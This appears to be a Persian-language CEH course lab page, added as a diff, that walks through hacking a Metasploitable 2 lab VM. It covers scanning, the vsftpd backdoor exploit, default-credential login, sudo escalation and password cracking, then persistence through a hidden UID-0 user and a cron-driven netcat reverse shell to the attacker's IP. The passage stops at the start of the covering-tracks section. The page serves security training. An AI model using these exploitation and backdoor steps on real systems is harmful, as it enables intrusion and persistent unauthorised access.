@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>آزمایشگاه: Session 1 System Hacking - دوره CEH V13</title>
+    <link rel="stylesheet" href="../../style.css">
+    <style>
+        .step-card {
+            background: white;
+            padding: 20px 25px;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            margin-bottom: 20px;
+            border-right: 4px solid #2a7de1;
+        }
+        .step-card h3 {
+            margin-top: 0;
+            color: #0b3b5c;
+            border-bottom: none;
+            font-size: 1.2rem;
+        }
+        .step-card .badge {
+            display: inline-block;
+            background: #e8f0fe;
+            color: #2a7de1;
+            padding: 2px 12px;
+            border-radius: 12px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .step-card .phase-badge {
+            display: inline-block;
+            padding: 3px 14px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        .phase-recon { background: #d4edda; color: #155724; }
+        .phase-scan { background: #cce5ff; color: #004085; }
+        .phase-access { background: #fff3cd; color: #856404; }
+        .phase-post { background: #f8d7da; color: #721c24; }
+        .phase-clean { background: #d1ecf1; color: #0c5460; }
+
+        .warning-box {
+            background: #fef0e8;
+            border-right: 4px solid #e74c3c;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin: 12px 0;
+            font-size: 0.95rem;
+        }
+        .tip-box {
+            background: #e8fef0;
+            border-right: 4px solid #27ae60;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin: 12px 0;
+            font-size: 0.95rem;
+        }
+        .info-box {
+            background: #e8f0fe;
+            border-right: 4px solid #2a7de1;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin: 12px 0;
+            font-size: 0.95rem;
+        }
+        .highlight-box {
+            background: #e8f0fe;
+            border-right: 6px solid #ff9f1c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .code-block {
+            position: relative;
+            background: #1e2a3a;
+            padding: 15px;
+            border-radius: 10px;
+            overflow-x: auto;
+            margin: 12px 0;
+            border-left: 4px solid #2a7de1;
+        }
+        .code-block code {
+            background: transparent;
+            border: none;
+            color: #e4eef7;
+            padding: 0;
+            font-size: 0.92rem;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+        .copy-btn {
+            background: #4a5a7a;
+            color: white;
+            border: none;
+            padding: 4px 14px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            cursor: pointer;
+            float: left;
+            transition: background 0.2s;
+            font-weight: 600;
+        }
+        .copy-btn:hover {
+            background: #2a7de1;
+        }
+        .output-box {
+            background: #1a2a3a;
+            color: #b6d4f0;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.88rem;
+            border-right: 3px solid #4a8a5a;
+            overflow-x: auto;
+        }
+        .output-box .highlight-text { color: #f0c060; }
+        .output-box .success-text { color: #7ddf9a; }
+        .output-box .error-text { color: #f08080; }
+
+        .tools-used {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin: 10px 0;
+        }
+        .tools-used .tool-tag {
+            background: #1e2a3a;
+            color: #e4eef7;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-family: 'Courier New', monospace;
+            border: 1px solid #3a4a5a;
+        }
+        .tools-used .tool-tag.primary { border-color: #2a7de1; }
+        .tools-used .tool-tag.success { border-color: #27ae60; }
+        .tools-used .tool-tag.warning { border-color: #f39c12; }
+        .tools-used .tool-tag.danger { border-color: #e74c3c; }
+        .tools-used .tool-tag.info { border-color: #2a7de1; }
+
+        .objective-list {
+            list-style: none;
+            padding: 0;
+        }
+        .objective-list li {
+            padding: 6px 0;
+            border-bottom: 1px solid #f0f2f5;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .objective-list li:before {
+            content: "🎯";
+            font-size: 1.1rem;
+        }
+
+        .question-box {
+            background: #f8f9fa;
+            border-right: 4px solid #6c757d;
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        .question-box strong {
+            color: #0b3b5c;
+        }
+
+        @media (max-width: 768px) {
+            .step-card {
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== نوار ناوبری ===== -->
+    <div class="nav-bar">
+        <span dir='ltr'>📘 CEH V13</span>
+        <span dir='ltr'>
+            <a href="../index.html">خانه</a> |
+            <a href="../index.html">آزمایشگاه‌ها</a>
+        </span>
+    </div>
+
+    <h1>⚡ آزمایشگاه: System Hacking</h1>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱: معرفی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🔰 معرفی آزمایشگاه</h2>
+        <p>
+            در این آزمایشگاه، شما یک سناریوی کامل از <b>هک سیستم (System Hacking)</b> را بر روی ماشین هدف <b>Metasploitable 2</b> پیاده‌سازی خواهید کرد. این آزمایشگاه شامل تمام مراحل اصلی یک حمله موفق است:
+        </p>
+        <ul>
+            <li><b>شناسایی (Reconnaissance):</b> جمع‌آوری اطلاعات از هدف</li>
+            <li><b>اسکن (Scanning):</b> شناسایی پورت‌های باز و سرویس‌ها</li>
+            <li><b>دسترسی (Gaining Access):</b> نفوذ با استفاده از یک آسیب‌پذیری</li>
+            <li><b>افزایش دسترسی (Privilege Escalation):</b> دستیابی به دسترسی root</li>
+            <li><b>حفظ دسترسی (Maintaining Access):</b> ایجاد درب پشتی</li>
+            <li><b>پاک کردن ردپا (Covering Tracks):</b> حذف آثار حمله</li>
+        </ul>
+
+        <div class="highlight-box">
+            <b>🎯 اهداف این آزمایشگاه:</b>
+            <ul>
+                <li>تسلط بر مراحل کامل هک سیستم</li>
+                <li>کار با ابزارهای Metasploit, John the Ripper, Netcat</li>
+                <li>درک مفهوم افزایش دسترسی (Privilege Escalation)</li>
+                <li>یادگیری تکنیک‌های حفظ دسترسی و پاک کردن ردپا</li>
+                <li>توانایی مستندسازی کامل یک حمله</li>
+            </ul>
+        </div>
+
+        <div class="info-box">
+            <b>🖥️ محیط مورد نیاز:</b>
+            <ul>
+                <li><b>حمله‌کننده:</b> Kali Linux (IP: 192.168.56.101)</li>
+                <li><b>هدف:</b> Metasploitable 2 (IP: 192.168.56.102)</li>
+                <li><b>ابزارهای مورد استفاده:</b> Nmap, Metasploit, John the Ripper, Netcat, Hydra</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۲: مرحله شناسایی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🔍 مرحله ۱: شناسایی (Reconnaissance)</h2>
+        <p>
+            در این مرحله، اطلاعات اولیه درباره هدف جمع‌آوری می‌شود. این کار بدون تماس مستقیم با هدف (غیرفعال) یا با تماس حداقلی انجام می‌شود.
+        </p>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۱</span>
+            <span dir='ltr' class="phase-badge phase-recon">شناسایی</span>
+            <h3>بررسی زنده بودن هدف با Ping</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>ping -c 4 192.168.56.102</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="success-text">✅ 64 bytes from 192.168.56.102: icmp_seq=1 ttl=64 time=0.456 ms</span><br>
+                <span dir='ltr' class="success-text">✅ 64 bytes from 192.168.56.102: icmp_seq=2 ttl=64 time=0.389 ms</span><br>
+                <span dir='ltr' class="success-text">✅ 64 bytes from 192.168.56.102: icmp_seq=3 ttl=64 time=0.412 ms</span><br>
+                <span dir='ltr' class="success-text">✅ 64 bytes from 192.168.56.102: icmp_seq=4 ttl=64 time=0.398 ms</span><br>
+                <span dir='ltr' class="highlight-text">--- 192.168.56.102 ping statistics ---</span><br>
+                <span dir='ltr' class="success-text">4 packets transmitted, 4 received, 0% packet loss</span>
+            </div>
+            <div class="tip-box">
+                <b>💡 توضیح:</b> پاسخ موفق به پینگ نشان‌دهنده زنده بودن هدف است. TTL=64 معمولاً نشان‌دهنده سیستم لینوکس است.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۲</span>
+            <span dir='ltr' class="phase-badge phase-recon">شناسایی</span>
+            <h3>شناسایی سرویس‌های در حال اجرا</h3>
+            <p>با استفاده از Nmap، می‌توان اطلاعات بیشتری درباره سیستم هدف به دست آورد.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>nmap -sV 192.168.56.102</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="highlight-text">Starting Nmap 7.94 ( https://nmap.org )</span><br>
+                <span dir='ltr' class="highlight-text">Nmap scan report for 192.168.56.102</span><br>
+                Host is up (0.00043s latency).<br>
+                Not shown: 977 closed tcp ports (reset)<br>
+                PORT     STATE SERVICE     VERSION<br>
+                <span dir='ltr' class="success-text">21/tcp   open  ftp         vsftpd 2.3.4</span><br>
+                <span dir='ltr' class="success-text">22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br>
+                <span dir='ltr' class="success-text">23/tcp   open  telnet      Linux telnetd</span><br>
+                <span dir='ltr' class="success-text">25/tcp   open  smtp        Postfix smtpd</span><br>
+                <span dir='ltr' class="success-text">53/tcp   open  domain      ISC BIND 9.4.2</span><br>
+                <span dir='ltr' class="success-text">80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)</span><br>
+                <span dir='ltr' class="success-text">111/tcp  open  rpcbind     2 (RPC #100000)</span><br>
+                <span dir='ltr' class="success-text">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br>
+                <span dir='ltr' class="success-text">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br>
+                <span dir='ltr' class="success-text">512/tcp  open  exec        netkit-rsh rexecd</span><br>
+                <span dir='ltr' class="success-text">513/tcp  open  login       OpenBSD or Solaris rlogind</span><br>
+                <span dir='ltr' class="success-text">514/tcp  open  tcpwrapped</span><br>
+                <span dir='ltr' class="success-text">1099/tcp open  rmiregistry GNU Classpath grmiregistry</span><br>
+                <span dir='ltr' class="success-text">1524/tcp open  ingreslock?</span><br>
+                <span dir='ltr' class="success-text">2049/tcp open  nfs         2-4 (RPC #100003)</span><br>
+                <span dir='ltr' class="success-text">2121/tcp open  ftp         ProFTPD 1.3.1</span><br>
+                <span dir='ltr' class="success-text">3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5</span><br>
+                <span dir='ltr' class="success-text">5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7</span><br>
+                <span dir='ltr' class="success-text">5900/tcp open  vnc         VNC (protocol 3.3)</span><br>
+                <span dir='ltr' class="success-text">6000/tcp open  X11         (access denied)</span><br>
+                <span dir='ltr' class="success-text">6667/tcp open  irc         UnrealIRCd</span><br>
+                <span dir='ltr' class="success-text">8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)</span><br>
+                <span dir='ltr' class="success-text">8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1</span>
+            </div>
+            <div class="info-box">
+                <b>📌 تحلیل نتایج:</b>
+                <ul>
+                    <li>پورت <b>۲۱ (FTP)</b> با نسخه vsftpd 2.3.4 – این نسخه دارای یک درب پشتی معروف است!</li>
+                    <li>پورت <b>۲۲ (SSH)</b> – نسخه OpenSSH 4.7p1 قدیمی است.</li>
+                    <li>پورت <b>۸۰ (HTTP)</b> – Apache 2.2.8 با آسیب‌پذیری‌های شناخته‌شده.</li>
+                    <li>پورت <b>۳۳۰۶ (MySQL)</b> – نسخه 5.0.51a قدیمی.</li>
+                    <li>پورت <b>۱۵۲۴</b> – یک سرویس مشکوک که ممکن است درب پشتی باشد.</li>
+                </ul>
+            </div>
+            <div class="tip-box">
+                <b>💡 نکته:</b> هرچه اطلاعات بیشتری در این مرحله جمع‌آوری کنید، مراحل بعدی هدفمندتر خواهد بود.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۳</span>
+            <span dir='ltr' class="phase-badge phase-recon">شناسایی</span>
+            <h3>جستجوی اطلاعات عمومی در اینترنت</h3>
+            <p>برای هر سرویس و نسخه شناسایی شده، می‌توانید آسیب‌پذیری‌های شناخته‌شده را جستجو کنید.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># جستجوی آسیب‌پذیری vsftpd 2.3.4
+searchsploit vsftpd 2.3.4</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="highlight-text">----------------------------------</span><br>
+                <span dir='ltr' class="highlight-text"> Exploit Title                        |  Path</span><br>
+                <span dir='ltr' class="highlight-text">----------------------------------</span><br>
+                <span dir='ltr' class="success-text">vsftpd 2.3.4 - Backdoor Command Execution</span><br>
+                <span dir='ltr' class="success-text">vsftpd 2.3.4 - Remote Code Execution</span><br>
+                <span dir='ltr' class="highlight-text">----------------------------------</span>
+            </div>
+            <div class="info-box">
+                <b>📌 یافته مهم:</b> نسخه vsftpd 2.3.4 دارای یک درب پشتی است که به هکر اجازه می‌دهد بدون نیاز به احراز هویت، به سیستم نفوذ کند. این یک نقطه ورود عالی است!
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۳: مرحله اسکن -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📡 مرحله ۲: اسکن و شمارش (Scanning & Enumeration)</h2>
+        <p>
+            در این مرحله، اطلاعات دقیق‌تری از سیستم هدف جمع‌آوری می‌شود. این شامل شناسایی کاربران، اشتراک‌های شبکه و پیکربندی‌های سیستم است.
+        </p>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۱</span>
+            <span dir='ltr' class="phase-badge phase-scan">اسکن</span>
+            <h3>اسکن کامل پورت‌ها</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>nmap -p- -sV 192.168.56.102</code></pre>
+            </div>
+            <div class="tip-box">
+                <b>💡 توضیح:</b> گزینه <code dir='ltr'>-p-</code> تمام ۶۵۵۳۵ پورت را اسکن می‌کند و <code dir='ltr'>-sV</code> نسخه سرویس‌ها را شناسایی می‌کند.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۲</span>
+            <span dir='ltr' class="phase-badge phase-scan">اسکن</span>
+            <h3>شمارش اشتراک‌های SMB</h3>
+            <p>SMB (پورت ۴۴۵) معمولاً اشتراک‌های شبکه را ارائه می‌دهد. از <code dir='ltr'>smbclient</code> برای مشاهده اشتراک‌ها استفاده می‌کنیم.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>smbclient -L //192.168.56.102 -N</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="highlight-text">Sharename       Type      Comment</span><br>
+                <span dir='ltr' class="success-text">print$         Disk      Printer Drivers</span><br>
+                <span dir='ltr' class="success-text">tmp            Disk      Temporary file space</span><br>
+                <span dir='ltr' class="success-text">IPC$           IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))</span><br>
+                <span dir='ltr' class="success-text">data           Disk      Data share</span>
+            </div>
+            <div class="tip-box">
+                <b>💡 نکته:</b> اشتراک <code dir='ltr'>tmp</code> معمولاً قابل نوشتن است و می‌تواند برای آپلود بدافزار استفاده شود.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۳</span>
+            <span dir='ltr' class="phase-badge phase-scan">اسکن</span>
+            <h3>شمارش کاربران با enum4linux</h3>
+            <p><code dir='ltr'>enum4linux</code> یک ابزار قدرتمند برای استخراج اطلاعات از سیستم‌های SMB است.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>enum4linux -U 192.168.56.102</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="highlight-text">[+] Enumerating users using SID S-1-5-21-... and logon username='', password=''</span><br>
+                <span dir='ltr' class="success-text">S-1-5-21-...-500 *unknown*\*unknown* (8)</span><br>
+                <span dir='ltr' class="success-text">S-1-5-21-...-501 METASPLOITABLE\nobody (Local User)</span><br>
+                <span dir='ltr' class="success-text">S-1-5-21-...-513 METASPLOITABLE\Domain Users (Domain Group)</span><br>
+                <span dir='ltr' class="success-text">S-1-5-21-...-1000 METASPLOITABLE\msfadmin (Local User)</span><br>
+                <span dir='ltr' class="success-text">S-1-5-21-...-1002 METASPLOITABLE\postgres (Local User)</span><br>
+                <span dir='ltr' class="success-text">S-1-5-21-...-1003 METASPLOITABLE\user (Local User)</span><br>
+                <span dir='ltr' class="success-text">S-1-5-21-...-1004 METASPLOITABLE\service (Local User)</span>
+            </div>
+            <div class="info-box">
+                <b>📌 یافته مهم:</b> کاربر <b>msfadmin</b> شناسایی شد. این کاربر معمولاً رمز پیش‌فرض <code dir='ltr'>msfadmin</code> دارد و می‌تواند برای ورود به سیستم استفاده شود.
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۴: مرحله دسترسی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🔓 مرحله ۳: دسترسی (Gaining Access)</h2>
+        <p>
+            با توجه به اطلاعات جمع‌آوری شده، دو روش اصلی برای نفوذ به سیستم وجود دارد:
+        </p>
+        <ul>
+            <li><b>روش ۱:</b> استفاده از درب پشتی vsftpd 2.3.4 با Metasploit</li>
+            <li><b>روش ۲:</b> استفاده از رمز پیش‌فرض کاربر msfadmin (SSH یا FTP)</li>
+        </ul>
+        <p>ما هر دو روش را بررسی می‌کنیم.</p>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۱</span>
+            <span dir='ltr' class="phase-badge phase-access">دسترسی</span>
+            <h3>روش ۱: بهره‌برداری از vsftpd 2.3.4 با Metasploit</h3>
+            <p>این روش از درب پشتی موجود در نسخه vsftpd 2.3.4 استفاده می‌کند.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST 192.168.56.102
+set RPORT 21
+exploit</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="success-text">[*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)</span><br>
+                <span dir='ltr' class="success-text">[*] 192.168.56.102:21 - Sending backdoor command</span><br>
+                <span dir='ltr' class="success-text">[*] Command shell session 1 opened (192.168.56.101:45123 -> 192.168.56.102:6200)</span><br>
+                <span dir='ltr' class="highlight-text">id</span><br>
+                <span dir='ltr' class="success-text">uid=0(root) gid=0(root) groups=0(root)</span>
+            </div>
+            <div class="highlight-box">
+                <b>🎉 موفقیت!</b>
+                <p>
+                    شما با موفقیت به سیستم نفوذ کرده‌اید و <b>دسترسی root</b> را به دست آورده‌اید.
+                    این یک شل مستقیم روی پورت ۶۲۰۰ باز شده است.
+                </p>
+            </div>
+            <div class="tip-box">
+                <b>💡 توضیح:</b> نسخه vsftpd 2.3.4 دارای یک کد مخرب است که در صورت ارسال یک دستور خاص، یک شل root روی پورت ۶۲۰۰ باز می‌کند.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۲</span>
+            <span dir='ltr' class="phase-badge phase-access">دسترسی</span>
+            <h3>روش ۲: ورود با رمز پیش‌فرض msfadmin</h3>
+            <p>با استفاده از رمز پیش‌فرض کاربر msfadmin، می‌توانید به SSH یا FTP متصل شوید.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>ssh msfadmin@192.168.56.102
+# رمز عبور: msfadmin</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="success-text">msfadmin@192.168.56.102's password:</span><br>
+                <span dir='ltr' class="success-text">Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686</span><br>
+                <span dir='ltr' class="success-text">Welcome to Ubuntu 8.04.2 LTS!</span><br>
+                <span dir='ltr' class="highlight-text">msfadmin@metasploitable:~$</span>
+            </div>
+            <div class="tip-box">
+                <b>💡 نکته:</b> این روش ساده‌تر است اما فقط دسترسی کاربر عادی (غیر root) را فراهم می‌کند. برای دسترسی root باید افزایش دسترسی انجام دهید.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۳</span>
+            <span dir='ltr' class="phase-badge phase-access">دسترسی</span>
+            <h3>بررسی دسترسی فعلی</h3>
+            <p>پس از نفوذ، وضعیت کاربر و سیستم را بررسی کنید:</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>whoami
+id
+uname -a
+hostname</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="highlight-text">msfadmin@metasploitable:~$ whoami</span><br>
+                msfadmin<br>
+                <span dir='ltr' class="highlight-text">msfadmin@metasploitable:~$ id</span><br>
+                uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),115(admin),1000(msfadmin)<br>
+                <span dir='ltr' class="highlight-text">msfadmin@metasploitable:~$ uname -a</span><br>
+                Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+            </div>
+            <div class="info-box">
+                <b>📌 تحلیل:</b> کاربر msfadmin است و دسترسی root ندارد (uid=1000). باید دسترسی خود را افزایش دهیم.
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۵: افزایش دسترسی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📈 مرحله ۴: افزایش دسترسی (Privilege Escalation)</h2>
+        <p>
+            پس از نفوذ اولیه، معمولاً دسترسی محدودی دارید. برای کنترل کامل سیستم، باید دسترسی خود را به <b>root</b> افزایش دهید.
+        </p>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۱</span>
+            <span dir='ltr' class="phase-badge phase-post">افزایش دسترسی</span>
+            <h3>بررسی sudo برای کاربر فعلی</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo -l</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="highlight-text">User msfadmin may run the following commands on this host:</span><br>
+                <span dir='ltr' class="success-text">(ALL) ALL</span>
+            </div>
+            <div class="highlight-box">
+                <b>🎉 کاربر msfadmin می‌تواند همه دستورات را با sudo اجرا کند!</b>
+                <p>
+                    این یعنی کاربر msfadmin در گروه sudoers قرار دارد و می‌تواند با <code dir='ltr'>sudo</code> به root دسترسی پیدا کند.
+                </p>
+            </div>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo su -
+# یا
+sudo -i</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="success-text">root@metasploitable:~#</span>
+            </div>
+            <div class="tip-box">
+                <b>💡 نکته:</b> اگر کاربر قابلیت sudo نداشت، باید از روش‌های دیگری مانند بهره‌برداری از آسیب‌پذیری‌های محلی یا کرک پسورد root استفاده می‌کردید.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۲</span>
+            <span dir='ltr' class="phase-badge phase-post">افزایش دسترسی</span>
+            <h3>روش جایگزین: کرک پسورد root</h3>
+            <p>اگر sudo در دسترس نبود، می‌توانید فایل <code dir='ltr'>/etc/shadow</code> را استخراج کرده و با <b>John the Ripper</b> یا <b>Hashcat</b> کرک کنید.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># استخراج فایل shadow (با دسترسی root)
+cat /etc/shadow
+
+# یا از طریق آسیب‌پذیری دیگر، فایل را دانلود کنید
+# سپس با John the Ripper کرک کنید
+john shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="highlight-text">$6$...$...:root:17247:0:99999:7:::</span><br>
+                <span dir='ltr' class="highlight-text">$1$...$...:msfadmin:17247:0:99999:7:::</span><br>
+                <span dir='ltr' class="success-text">Loading password hashes... (2 hashes loaded)</span><br>
+                <span dir='ltr' class="success-text">Press 'q' or Ctrl-C to abort, almost any other key for status</span><br>
+                <span dir='ltr' class="success-text">0g 0:00:00:01 0.00% 0g/s 0p/s 0c/s 0C/s</span><br>
+                <span dir='ltr' class="success-text">password         (msfadmin)</span>
+            </div>
+            <div class="info-box">
+                <b>📌 تحلیل:</b> رمز عبور کاربر msfadmin پیدا شد. این روش برای سیستم‌هایی که sudo ندارند بسیار مفید است.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۳</span>
+            <span dir='ltr' class="phase-badge phase-post">افزایش دسترسی</span>
+            <h3>تأیید دسترسی root</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>whoami
+id</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="success-text">root</span><br>
+                <span dir='ltr' class="success-text">uid=0(root) gid=0(root) groups=0(root)</span>
+            </div>
+            <div class="highlight-box">
+                <b>✅ موفقیت!</b>
+                <p>دسترسی root با موفقیت به دست آمد. اکنون کنترل کامل بر سیستم هدف دارید.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۶: حفظ دسترسی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🔗 مرحله ۵: حفظ دسترسی (Maintaining Access)</h2>
+        <p>
+            پس از دسترسی root، باید راهی برای بازگشت به سیستم ایجاد کنید. این کار با نصب یک <b>درب پشتی (Backdoor)</b> انجام می‌شود.
+        </p>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۱</span>
+            <span dir='ltr' class="phase-badge phase-post">حفظ دسترسی</span>
+            <h3>ایجاد یک کاربر مخفی</h3>
+            <p>ایجاد یک کاربر مخفی با دسترسی SSH، یکی از ساده‌ترین روش‌های حفظ دسترسی است.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># ایجاد کاربر با UID 0 (همان root)
+useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
+
+# تنظیم رمز عبور
+echo "backdoor:h4ck3r!" | chpasswd
+
+# مخفی کردن کاربر از لیست کاربران عادی
+echo "backdoor:x:0:0:Backdoor User:/root:/bin/bash" >> /etc/passwd</code></pre>
+            </div>
+            <div class="warning-box">
+                <b>⚠️ هشدار:</b> این روش در محیط‌های واقعی قابل شناسایی است. برای مخفی‌سازی بیشتر، از روت‌کیت‌ها استفاده می‌شود.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۲</span>
+            <span dir='ltr' class="phase-badge phase-post">حفظ دسترسی</span>
+            <h3>ایجاد شل معکوس با Netcat (کرون جاب)</h3>
+            <p>یک Cron Job تنظیم می‌کنیم که هر دقیقه یک شل معکوس به سرور ما ارسال کند.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># ایجاد یک اسکریپت شل معکوس
+echo '#!/bin/bash
+nc -e /bin/bash 192.168.56.101 4444' > /tmp/backdoor.sh
+
+chmod +x /tmp/backdoor.sh
+
+# اضافه کردن به Cron
+echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab</code></pre>
+            </div>
+            <div class="tip-box">
+                <b>💡 توضیح:</b> هر دقیقه، سیستم به IP شما (192.168.56.101) روی پورت ۴۴۴۴ متصل می‌شود و یک شل root در اختیار شما قرار می‌دهد.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۳</span>
+            <span dir='ltr' class="phase-badge phase-post">حفظ دسترسی</span>
+            <h3>تنظیم Listener برای دریافت شل</h3>
+            <p>در Kali، یک listener راه‌اندازی کنید تا اتصال را دریافت کند.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>nc -lvnp 4444</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="success-text">listening on [any] 4444 ...</span><br>
+                <span dir='ltr' class="success-text">connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 51234</span><br>
+                <span dir='ltr' class="highlight-text">whoami</span><br>
+                root
+            </div>
+            <div class="highlight-box">
+                <b>✅ موفقیت!</b>
+                <p>شل معکوس با موفقیت دریافت شد. اکنون هر زمان که سیستم روشن باشد، می‌توانید به آن متصل شوید.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۷: پاک کردن ردپا -->
+    <!-- ============================================================ -->
+    <div class="card">
